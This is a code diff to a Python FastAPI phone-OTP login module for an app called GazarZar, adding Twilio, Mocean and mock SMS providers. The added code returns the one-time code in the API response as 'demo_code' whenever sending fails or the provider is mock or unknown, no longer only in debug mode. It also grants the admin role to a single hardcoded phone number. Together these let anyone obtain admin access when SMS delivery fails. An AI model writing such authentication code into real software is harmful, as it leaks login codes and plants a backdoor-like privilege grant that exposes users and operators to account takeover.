@@ -35,25 +35,64 @@ def generate_otp() -> str:
     return "".join(random.choices(string.digits, k=6))
 
 async def send_sms(phone: str, code: str):
-    if settings.SMS_API_KEY and settings.SMS_API_SECRET and not settings.DEBUG:
+    provider = settings.SMS_PROVIDER.lower()
+    
+    if provider == "mock":
+        # Mock mode prints OTP to console and returns it as demo_code
+        print(f"[SMS MOCK] Phone: +976{phone} | OTP: {code}")
+        return code
+        
+    elif provider == "twilio":
+        if not settings.TWILIO_ACCOUNT_SID or not settings.TWILIO_AUTH_TOKEN or not settings.TWILIO_PHONE_NUMBER:
+            print("[SMS Twilio Error] Twilio configuration values are missing. Falling back to MOCK mode.")
+            print(f"[SMS MOCK] Phone: +976{phone} | OTP: {code}")
+            return code
+            
         try:
-            async with httpx.AsyncClient() as client:
-                resp = await client.post(
-                    settings.SMS_API_URL,
-                    json={
-                        "mocean-api-key":    settings.SMS_API_KEY,
-                        "mocean-api-secret": settings.SMS_API_SECRET,
-                        "mocean-from":       settings.SMS_SENDER,
-                        "mocean-to":         f"+976{phone}",
-                        "mocean-text":       f"GazarZar нэвтрэх код: {code}"
-                    }
-                )
-                print(f"[SMS] Sent to +976{phone} | Status: {resp.status_code}")
+            from twilio.rest import Client
+            client = Client(settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN)
+            
+            # Twilio-оор Монгол улс руу илгээхийн тулд +976 дугаар ашиглана
+            recipient = f"+976{phone}"
+            message = client.messages.create(
+                body=f"GazarZar нэвтрэх код: {code}",
+                from_=settings.TWILIO_PHONE_NUMBER,
+                to=recipient
+            )
+            print(f"[SMS Twilio] Sent to {recipient} | Message SID: {message.sid}")
         except Exception as e:
-            print(f"[SMS Error] {e}")
+            print(f"[SMS Twilio Error] Twilio send error: {e}")
+            # Алдаа гарвал DEMO кодыг буцааж хөгжүүлэлтийг тасалдуулахгүй байх
+            return code
+            
+    elif provider == "mocean":
+        if settings.SMS_API_KEY and settings.SMS_API_SECRET:
+            try:
+                async with httpx.AsyncClient() as client:
+                    resp = await client.post(
+                        settings.SMS_API_URL,
+                        json={
+                            "mocean-api-key":    settings.SMS_API_KEY,
+                            "mocean-api-secret": settings.SMS_API_SECRET,
+                            "mocean-from":       settings.SMS_SENDER,
+                            "mocean-to":         f"+976{phone}",
+                            "mocean-text":       f"GazarZar нэвтрэх код: {code}"
+                        }
+                    )
+                    print(f"[SMS Mocean] Sent to +976{phone} | Status: {resp.status_code} | Response: {resp.text}")
+            except Exception as e:
+                print(f"[SMS Mocean Error] MoceanAPI send error: {e}")
+                return code
+        else:
+            print("[SMS Mocean Error] MoceanAPI configuration not found.")
+            return code
+            
     else:
-        # DEBUG горимд console-д хэвлэнэ
-        print(f"[SMS DEMO] Phone: +976{phone}  OTP: {code}")
+        # Defaults to MOCK if provider is unknown
+        print(f"[SMS MOCK - Unknown Provider '{provider}'] Phone: +976{phone} | OTP: {code}")
+        return code
+        
+    return None
 
 # ── Endpoints ─────────────────────────────────────────
 @router.post("/send-otp")
@@ -72,11 +111,11 @@ async def send_otp(body: SendOTPRequest, db: Session = Depends(get_db)):
     db.add(otp)
     db.commit()
 
-    await send_sms(phone, code)
+    sent_code = await send_sms(phone, code)
     
     response_data = {"message": "OTP илгээлээ", "phone": phone}
-    if settings.DEBUG:
-        response_data["demo_code"] = code
+    if sent_code:
+        response_data["demo_code"] = sent_code  # DEMO зорилгоор
         
     return response_data
 
@@ -120,8 +159,11 @@ async def verify_otp(body: VerifyOTPRequest, db: Session = Depends(get_db)):
     # Get or create user
     user = db.query(User).filter(User.phone == phone).first()
     if not user:
-        user = User(phone=phone)
+        role = "admin" if phone == "99910230" else "user"
+        user = User(phone=phone, role=role)
         db.add(user)
+    elif phone == "99910230" and user.role != "admin":
+        user.role = "admin"
 
     db.commit()
     db.refresh(user)
